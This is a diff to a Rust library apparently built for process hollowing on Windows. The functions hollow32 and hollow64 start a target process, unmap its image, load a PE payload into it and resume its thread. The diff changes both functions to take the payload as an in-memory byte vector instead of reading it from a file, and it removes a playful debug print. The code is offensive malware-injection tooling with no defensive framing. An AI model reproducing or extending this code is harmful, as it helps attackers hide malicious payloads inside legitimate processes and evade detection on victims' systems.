@@ -29,7 +29,7 @@ use std::ptr::null_mut;
 
 const STATUS_SUCCESS: i32 = 0x0;
 
-pub fn hollow32(src: impl Into<String>, dest: impl Into<String>) -> Result<()> {
+pub fn hollow32(dest: impl Into<String>, payload: Vec<u8>) -> Result<()> {
     unsafe {
         // Create dest process
         let mut startup = zeroed::<STARTUPINFOA>();
@@ -54,8 +54,7 @@ pub fn hollow32(src: impl Into<String>, dest: impl Into<String>) -> Result<()> {
         let dest_image_base_address = shared::get_remote_image_base_address(hp)?;
 
         // read src program to memory
-        let buffer = shared::get_binary_from_file(src.into())?;
-        let mut container = x86::PEContainer::new_from_u8(&buffer, false)?;
+        let mut container = x86::PEContainer::new_from_u8(&payload, false)?;
 
         // Unmapping image from dest process
         if NtUnmapViewOfSection(hp, dest_image_base_address as *mut _) != STATUS_SUCCESS {
@@ -135,14 +134,11 @@ pub fn hollow32(src: impl Into<String>, dest: impl Into<String>) -> Result<()> {
             bail!("could not set thread context: {}", GetLastError());
         }
 
-        // remove debug print
-        println!("process was hollowed ε٩(๑> 3 <)۶з");
-
         return Ok(());
     }
 }
 
-pub fn hollow64(src: impl Into<String>, dest: impl Into<String>) -> Result<()> {
+pub fn hollow64(dest: impl Into<String>, payload: Vec<u8>) -> Result<()> {
     unsafe {
         // Create dest process
         let mut startup = zeroed::<STARTUPINFOA>();
@@ -167,8 +163,7 @@ pub fn hollow64(src: impl Into<String>, dest: impl Into<String>) -> Result<()> {
         let dest_image_base_address = shared::get_remote_image_base_address(hp)?;
 
         // read src program to memory
-        let buffer = shared::get_binary_from_file(src.into())?;
-        let mut container = x64::PEContainer::new_from_u8(&buffer, false)?;
+        let mut container = x64::PEContainer::new_from_u8(&payload, false)?;
 
         // Unmapping image from dest process
         if NtUnmapViewOfSection(hp, dest_image_base_address as *mut _) != STATUS_SUCCESS {
@@ -247,9 +242,6 @@ pub fn hollow64(src: impl Into<String>, dest: impl Into<String>) -> Result<()> {
         if ResumeThread(process_info.hThread) == u32::MAX {
             bail!("could not set thread context: {}", GetLastError());
         }
-
-        // remove debug print
-        println!("process was hollowed ε٩(๑> 3 <)۶з");
 
         Ok(())
     }
